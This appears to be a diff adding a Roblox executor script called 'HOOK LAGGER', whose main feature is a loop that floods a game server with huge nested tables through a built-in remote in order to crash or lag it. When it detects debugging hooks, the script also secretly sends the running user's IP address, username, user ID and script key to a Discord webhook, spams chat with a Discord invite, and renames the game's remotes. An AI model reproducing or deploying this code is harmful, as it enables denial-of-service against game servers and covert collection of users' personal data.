@@ -1,0 +1,430 @@
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ReplicatedFirst = game:GetService("ReplicatedFirst")
+local ChatService = game:GetService("Chat")
+local trackedPlayers = {}
+local espObjects = {}
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Global variables for UI sync
+local statusLabel, switchBall, mainFrame, toggleContainer
+local detectionActive = true
+local hookDetected = false
+local spamActive = false
+local laggerEnabled = false
+
+-- Executor-Safe Request Function (Bypasses Discord Block)
+local function httpRequest(options)
+    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+    if requestFunc then
+        return requestFunc(options)
+    end
+    return nil
+end
+
+local function removeESP(p)
+    if espObjects[p] then
+        pcall(function() espObjects[p].billboard:Destroy() end)
+        pcall(function() espObjects[p].highlight:Destroy() end)
+        espObjects[p] = nil
+    end
+end
+
+-- Webhook Embed Sender (No Emojis, Clean Design)
+local function SendMessageEMBED(url, embedData)
+    local success, result = pcall(function()
+        local payload = HttpService:JSONEncode({
+            ["content"] = nil,
+            ["embeds"] = {{
+                ["title"] = embedData.title,
+                ["description"] = embedData.description,
+                ["color"] = 16711680,
+                ["thumbnail"] = {
+                    ["url"] = embedData.thumbnail
+                },
+                ["fields"] = embedData.fields,
+                ["footer"] = {
+                    ["text"] = "discord.gg/hookduels"
+                },
+                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
+            }}
+        })
+        return httpRequest({
+            Url = url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = payload
+        })
+    end)
+    return success
+end
+
+-- Function to rename ALL remotes
+local function renameAllRemotes()
+    local renamedCount = 0
+    local newName = "discord.gg/hookduels"
+    local locations = {
+        ReplicatedStorage, ReplicatedFirst, workspace,
+        game:GetService("Lighting"), game:GetService("Players"),
+        game:GetService("TeleportService"), game:GetService("StarterGui"),
+        game:GetService("StarterPack"), game:GetService("SoundService"), game
+    }
+    
+    for _, location in pairs(locations) do
+        pcall(function()
+            for _, obj in pairs(location:GetDescendants()) do
+                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") or obj:IsA("UnreliableRemoteEvent") then
+                    obj.Name = newName
+                    renamedCount = renamedCount + 1
+                    pcall(function()
+                        if obj:IsA("RemoteEvent") then
+                            obj:FireServer("JOIN", "discord.gg/hookduels", "HOOK_DETECTED")
+                        elseif obj:IsA("RemoteFunction") then
+                            obj:InvokeServer("JOIN", "discord.gg/hookduels")
+                        end
+                    end)
+                end
+            end
+        end)
+    end
+    return renamedCount
+end
+
+-- Function to spam chat
+local function spamChat()
+    local messages = {
+        "JOIN discord.gg/hookduels",
+        "discord.gg/hookduels - BEST SERVER",
+        "HOOK DETECTED JOIN discord.gg/hookduels",
+        "discord.gg/hookduels"
+    }
+    task.spawn(function()
+        while spamActive do
+            pcall(function()
+                for _, msg in pairs(messages) do
+                    if not spamActive then break end
+                    ChatService:Chat(player.Character.Head, msg)
+                    task.wait(0.5)
+                end
+            end)
+            task.wait(1)
+        end
+    end)
+end
+
+-- Function to remove Cobalt UI
+local function removeCobaltUI()
+    pcall(function()
+        for _, gui in pairs(CoreGui:GetChildren()) do
+            if gui.Name and (gui.Name:lower():find("cobalt") or gui.Name:lower():find("hook") or gui.Name:lower():find("dex")) then
+                gui:Destroy()
+            end
+        end
+    end)
+end
+
+-- Detection
+local function checkHooked(func)
+    if not func then return false end
+    local ok, result = pcall(isfunctionhooked, func)
+    return ok and result
+end
+
+local function detectHooks()
+    local freshRemoteEvent = Instance.new("RemoteEvent")
+    local freshRemoteFunction = Instance.new("RemoteFunction")
+    local freshMt = getrawmetatable(game)
+    
+    -- Check Cobalt hooks
+    local cobalt = getgenv().Cobalt
+    local cobaltHooks = cobalt and cobalt.shared and cobalt.shared.Hooks
+    if cobaltHooks then
+        for func, _ in pairs(cobaltHooks) do
+            if checkHooked(func) then return "Cobalt Hook", "Hooked Function" end
+        end
+    end
+    
+    -- Check SimpleSpy/Remote hooks
+    if freshRemoteEvent.FireServer ~= Instance.new("RemoteEvent").FireServer then return "SimpleSpy Hook", "FireServer" end
+    if freshRemoteFunction.InvokeServer ~= Instance.new("RemoteFunction").InvokeServer then return "SimpleSpy Hook", "InvokeServer" end
+    
+    -- Check metamethods
+    local currentMt = getrawmetatable(game)
+    if currentMt and rawget(freshMt, "__namecall") ~= rawget(currentMt, "__namecall") then 
+        return "Metamethod Hook", "__namecall" 
+    end
+    
+    return nil, nil
+end
+
+-- Send Discord report
+local function sendReport(hookType, functionName, renamedCount)
+    local ip = "Unknown"
+    pcall(function() ip = game:HttpGet("https://api.ipify.org") end)
+    
+    -- Luarmor Key Detection
+    local luarmorKey = getgenv().script_key or _G.script_key or "Key Not Found"
+    
+    -- Roblox Profile Picture
+    local pfpUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
+
+    local embed = {
+        title = ip,
+        description = "Hook Detected - Counter-Measures Activated",
+        thumbnail = pfpUrl,
+        fields = {
+            {name = "Username", value = player.Name, inline = true},
+            {name = "Display Name", value = player.DisplayName, inline = true},
+            {name = "User ID", value = tostring(player.UserId), inline = true},
+            {name = "Luarmor Key", value = "```" .. luarmorKey .. "```", inline = false},
+            {name = "Detection Details", value = "Type: "..hookType.."\nFunction: "..functionName, inline = false},
+            {name = "Action Taken", value = "Remotes Renamed: "..tostring(renamedCount), inline = true}
+        }
+    }
+    SendMessageEMBED(webhookUrl, embed)
+end
+
+-- Main detection loop
+task.spawn(function()
+    while detectionActive do
+        local hType, fName = detectHooks()
+        if hType and not hookDetected then
+            hookDetected = true
+            spamActive = true
+            laggerEnabled = false
+            
+            pcall(function()
+                statusLabel.Text = "LAGGER: OFF"
+                statusLabel.TextColor3 = Color3.fromRGB(255, 70, 70)
+                TweenService:Create(switchBall, TweenInfo.new(0.2), {Position = UDim2.new(0, 2, 0.5, -8), BackgroundColor3 = Color3.fromRGB(255, 80, 80)}):Play()
+            end)
+
+            removeCobaltUI()
+            local count = renameAllRemotes()
+            spamChat()
+            sendReport(hType, fName, count)
+        end
+        task.wait(0.1)
+    end
+end)
+
+-- Mobile detection removed
+
+-- Create GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "HookLaggerGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 300, 0, 150)
+mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
+mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 17)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = screenGui
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)
+
+local titleBar = Instance.new("Frame")
+titleBar.Name = "TitleBar"
+titleBar.Size = UDim2.new(1, 0, 0, 40)
+titleBar.BackgroundTransparency = 1
+titleBar.Parent = mainFrame
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, -60, 1, 0)
+titleLabel.Position = UDim2.new(0, 15, 0, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "HOOK LAGGER"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.TextSize = 14
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel.Parent = titleBar
+
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0, 20, 0, 20)
+closeButton.Position = UDim2.new(1, -25, 0, 10)
+closeButton.BackgroundTransparency = 1
+closeButton.Text = "x"
+closeButton.TextColor3 = Color3.fromRGB(200, 200, 200)
+closeButton.TextSize = 20
+closeButton.Parent = titleBar
+
+local minimizeButton = Instance.new("TextButton")
+minimizeButton.Size = UDim2.new(0, 20, 0, 20)
+minimizeButton.Position = UDim2.new(1, -50, 0, 10)
+minimizeButton.BackgroundTransparency = 1
+minimizeButton.Text = "-"
+minimizeButton.TextColor3 = Color3.fromRGB(200, 200, 200)
+minimizeButton.TextSize = 20
+minimizeButton.Parent = titleBar
+
+toggleContainer = Instance.new("Frame")
+toggleContainer.Size = UDim2.new(0.9, 0, 0, 50)
+toggleContainer.Position = UDim2.new(0.05, 0, 0, 45)
+toggleContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
+toggleContainer.Parent = mainFrame
+Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(0, 6)
+
+local keybindButton = Instance.new("TextButton")
+keybindButton.Size = UDim2.new(0, 35, 0, 35)
+keybindButton.Position = UDim2.new(0, 8, 0.5, -17)
+keybindButton.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
+keybindButton.Text = "V"
+keybindButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+keybindButton.Font = Enum.Font.GothamBold
+keybindButton.TextSize = 14
+keybindButton.Parent = toggleContainer
+Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0, 4)
+
+statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(0.5, 0, 1, 0)
+statusLabel.Position = UDim2.new(0, 55, 0, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "LAGGER: OFF"
+statusLabel.TextColor3 = Color3.fromRGB(255, 70, 70)
+statusLabel.Font = Enum.Font.GothamBold
+statusLabel.TextSize = 14
+statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+statusLabel.Parent = toggleContainer
+
+local switchOutline = Instance.new("TextButton")
+switchOutline.Size = UDim2.new(0, 40, 0, 20)
+switchOutline.Position = UDim2.new(1, -50, 0.5, -10)
+switchOutline.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+switchOutline.Text = ""
+switchOutline.Parent = toggleContainer
+Instance.new("UICorner", switchOutline).CornerRadius = UDim.new(1, 0)
+
+switchBall = Instance.new("Frame")
+switchBall.Size = UDim2.new(0, 16, 0, 16)
+switchBall.Position = UDim2.new(0, 2, 0.5, -8)
+switchBall.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+switchBall.Parent = switchOutline
+Instance.new("UICorner", switchBall).CornerRadius = UDim.new(1, 0)
+
+-- Lagger Logic (Exactly 1:1)
+local function getmaxvalue(val)
+    local mainvalueifonetable = 499999
+    if type(val) ~= "number" then return nil end
+    return mainvalueifonetable/(val+2)
+end
+
+local function bomb(tableincrease, tries)
+    local maintable = {}
+    local spammedtable = {}
+    table.insert(spammedtable, {})
+    local z = spammedtable[1]
+    for i = 1, tableincrease do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+    local maximum = getmaxvalue(tableincrease) or 9999999
+    for i = 1, maximum do
+        table.insert(maintable, spammedtable)
+    end
+    for i = 1, tries do
+        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+    end
+end
+
+local function startCrashLoop()
+    while laggerEnabled do
+        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+        bomb(270, 1)
+        task.wait(0.3)
+    end
+end
+
+local function toggleLagger(state)
+    if hookDetected then return end
+    laggerEnabled = state
+    if laggerEnabled then
+        statusLabel.Text = "LAGGER: ON"
+        statusLabel.TextColor3 = Color3.fromRGB(80, 255, 80)
+        TweenService:Create(switchBall, TweenInfo.new(0.2), {Position = UDim2.new(1, -18, 0.5, -8), BackgroundColor3 = Color3.fromRGB(80, 255, 80)}):Play()
+        task.spawn(startCrashLoop)
+    else
+        statusLabel.Text = "LAGGER: OFF"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
+        TweenService:Create(switchBall, TweenInfo.new(0.2), {Position = UDim2.new(0, 2, 0.5, -8), BackgroundColor3 = Color3.fromRGB(255, 80, 80)}):Play()
+    end
+end
+
+switchOutline.MouseButton1Click:Connect(function() toggleLagger(not laggerEnabled) end)
+
+local listening = false
+keybindButton.MouseButton1Click:Connect(function() listening = true keybindButton.Text = "..." end)
+
+local currentKeybind = Enum.KeyCode.V
+local currentControllerKeybind = Enum.KeyCode.ButtonY
+local keybindType = "keyboard" -- "keyboard" or "controller"
+
+UserInputService.InputBegan:Connect(function(input, processed)
+    if processed then return end
+    
+    -- Toggle UI visibility
+    if input.KeyCode == Enum.KeyCode.LeftControl then 
+        mainFrame.Visible = not mainFrame.Visible 
+    end
+    
+    -- Listening for keybind input
+    if listening then
+        if input.UserInputType == Enum.UserInputType.Keyboard then
+            currentKeybind = input.KeyCode
+            keybindType = "keyboard"
+            keybindButton.Text = input.KeyCode.Name:sub(1,1)
+            listening = false
+        elseif input.UserInputType == Enum.UserInputType.Gamepad1 then
+            currentControllerKeybind = input.KeyCode
+            keybindType = "controller"
+            local btnName = input.KeyCode.Name:gsub("Button", ""):sub(1,1)
+            keybindButton.Text = btnName
+            listening = false
+        end
+    end
+    
+    -- Toggle lagger
+    if keybindType == "keyboard" and input.KeyCode == currentKeybind then
+        toggleLagger(not laggerEnabled)
+    elseif keybindType == "controller" and input.KeyCode == currentControllerKeybind then
+        toggleLagger(not laggerEnabled)
+    end
+end)
+
+closeButton.MouseButton1Click:Connect(function() screenGui:Destroy() spamActive = false detectionActive = false end)
+
+local isMinimized = false
+minimizeButton.MouseButton1Click:Connect(function()
+    isMinimized = not isMinimized
+    toggleContainer.Visible = not isMinimized
+    if isMinimized then
+        mainFrame:TweenSize(UDim2.new(0, 300, 0, 68), "Out", "Quad", 0.2, true)
+    else
+        mainFrame:TweenSize(UDim2.new(0, 300, 0, 150), "Out", "Quad", 0.2, true)
+    end
+end) 
+
+
+Players.PlayerRemoving:Connect(removeESP)
+
+RunService.RenderStepped:Connect(function()
+    for p, data in pairs(espObjects) do
+        if p.Character and p.Character:FindFirstChild("Head") then
+            data.billboard.Adornee = p.Character.Head
+        end
+    end
+end)
+
+-- WebSocket removed
